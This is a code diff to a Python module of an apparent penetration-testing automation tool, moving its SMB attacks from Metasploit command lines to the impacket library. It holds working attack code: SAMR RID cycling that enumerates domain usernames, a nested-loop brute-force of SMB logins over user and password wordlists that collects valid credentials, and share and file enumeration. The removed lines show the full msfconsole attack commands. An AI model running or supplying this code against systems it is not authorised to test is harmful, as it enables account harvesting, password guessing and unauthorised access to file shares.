@@ -2,6 +2,10 @@ import subprocess
 import re
 from mods.mod_utils import *
 import os
+from impacket.dcerpc.v5 import transport, samr
+from impacket.smbconnection import SMBConnection
+from impacket.smb import SMB_DIALECT
+import socket
 
 smb_users = ["admin","user","manager","supervisor","administrator","test","operator","backup","lab","demo","smb"]
 original_users_len = len(smb_users)
@@ -28,94 +32,95 @@ def export_credentials():
 
 
 def rid_cycling(target, user="Guest", passw="", domain="."):
-    cmd = f'msfconsole -q -x "use scanner/smb/smb_lookupsid;set RHOSTS {target};set SMBUser {user};set SMBPass {passw};set MinRID 500;set MaxRID 5000;set THREADS 10;set SMBDomain {domain};run;exit;"'
-
     try:
-        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+        # Setup connection
+        rpctransport = transport.SMBTransport(target, 445, r'\samr', username=user, password=passw, domain=domain)
+        dce = rpctransport.get_dce_rpc()
+        dce.connect()
+        dce.bind(samr.MSRPC_UUID_SAMR)
+        
+        # Open SAMR connection
+        resp = samr.hSamrConnect(dce)
+        server_handle = resp['ServerHandle']
+        
+        # Enumerate domains
+        resp = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)
+        domains = resp['Buffer']['Buffer']
+        
+        temp_users = []
+        
+        for domain in domains:
+            print(f'[+] Found domain: {domain["Name"]}')
+            resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain['Name'])
+            resp = samr.hSamrOpenDomain(dce, server_handle, domainId=resp['DomainId'])
+            domain_handle = resp['DomainHandle']
+            
+            # RID cycling
+            for rid in range(500, 5000):
+                try:
+                    resp = samr.hSamrOpenUser(dce, domain_handle, rid)
+                    resp = samr.hSamrQueryInformationUser2(dce, resp['UserHandle'])
+                    user = resp['Buffer']['AccountName']
+                    printc(f'[+] {user}', BLUE)
+                    temp_users.append(user)
+                except:
+                    pass
+                    
+        if len(temp_users) > 0:
+            global smb_users
+            smb_users += temp_users
+            smb_users = list(set(smb_users))
+            export_wordlists(smb_users, smb_passwords)
+            
     except Exception as e:
         printc(f'[-] {e}', RED)
         return
-    if output:
-        if ('USER' in output):
-            rid_cycling_parse(output, cmd, user, passw)
-
-            log(output, cmd, target, 'msfconsole')
-
-
-def rid_cycling_parse(output, cmd, user='', passw=''):
-    global domain
-    global smb_users
-
-    print_banner('445')
-    print('[!]', cmd)
-    printc('[+] RID Cycling Attack to get Usernames', GREEN)
-    print(f'[!] Using these creds: {user} / {passw}')
-    print('')
-
-    temp_users = []
-
-    for line in output.splitlines():
-        if ('DOMAIN' in line) and ('LOCAL' in line) and (domain == '.'):
-            domain = re.findall(r'LOCAL.*DOMAIN\((.*) -', line)[0]
-            printc(f'[+] Domain: {domain}', BLUE)
-        if ('USER' in line):
-            user = re.findall(r'USER=(.*)\sRID', line)[0]
-            printc(f'[+] {user}', BLUE)
-            temp_users.append(user)
-    if len(temp_users) > 0:
-        smb_users += temp_users
-        smb_users = list(set(smb_users))
-        export_wordlists(smb_users, smb_passwords)
 
 
 def bruteforce(target, port):
     global credentials
-    cmd = f'msfconsole -q -x "use scanner/smb/smb_login;set rhosts {target};set RPORT {port};set SMBDomain {domain};set USER_AS_PASS true;set BLANK_PASSWORDS false;set PASS_FILE $(pwd)/smb_pass.txt; set USER_FILE $(pwd)/smb_users.txt;set VERBOSE false;run;exit;"'
-
-    try:
-        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
-    except Exception as e:
-        printc(f'[-] {e}', RED)
-        return
-
-    if output:
-        if ('[+]' in output):
-            print_banner('445')
-            print('[!]', cmd)
-            printc('[+] Creds Found!!!', GREEN)
-            print('')
-            for line in output.splitlines():
-                creds = re.findall(r"Success:\s\'(.*)\'", line)
-                if creds:
-                    creds = creds[0].split('\\')[1]
-                    if (creds.split(':')[1] == ''): continue
-                    printc(f'[+] {creds}', BLUE)
-                    credentials.append(creds)
-
-            log(output, cmd, target, 'msfconsole')
-            
+    
+    for user in smb_users:
+        for password in smb_passwords:
+            try:
+                conn = SMBConnection(target, target, sess_port=port)
+                conn.login(user, password, domain)
+                creds = f"{user}:{password}"
+                printc(f'[+] {creds}', BLUE)
+                credentials.append(creds)
+                conn.close()
+            except Exception:
+                pass
+                
     if credentials:
         export_credentials()
 
 
 def enumerate_shares(target, user='Guest', passw='', domain='.'):
-    cmd = f'msfconsole -q -x "use scanner/smb/smb_enumshares;set RHOSTS {target};set SMBPass {passw};set SMBUser {user};set SMBDomain {domain};set LogSpider 0;set MaxDepth 0;set ShowFiles true;set SpiderShares true;run;exit;"'
-
     try:
-        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+        conn = SMBConnection(target, target)
+        conn.login(user, passw, domain)
+        
+        shares = conn.listShares()
+        print_banner('445')
+        print(f'[!] Enumerating shares as {user}')
+        print('')
+        
+        for share in shares:
+            print(f'[+] Found share: {share["shi1_netname"]}')
+            try:
+                files = conn.listPath(share['shi1_netname'], '/*')
+                print(f'    Access: READ')
+                for file in files:
+                    print(f'    {file.get_longname()}')
+            except:
+                print(f'    Access: NO READ')
+                
+        conn.close()
+        
     except Exception as e:
         printc(f'[-] {e}', RED)
         return
-
-    if output:
-        if ('[+]' in output):
-            print_banner('445')
-            print('[!]', cmd)
-            print('[!] Enumerating Shares.')
-            print('')
-            print(output)
-
-            log(output, cmd, target, 'msfconsole')
 
 
 def handle_smb(target, port):
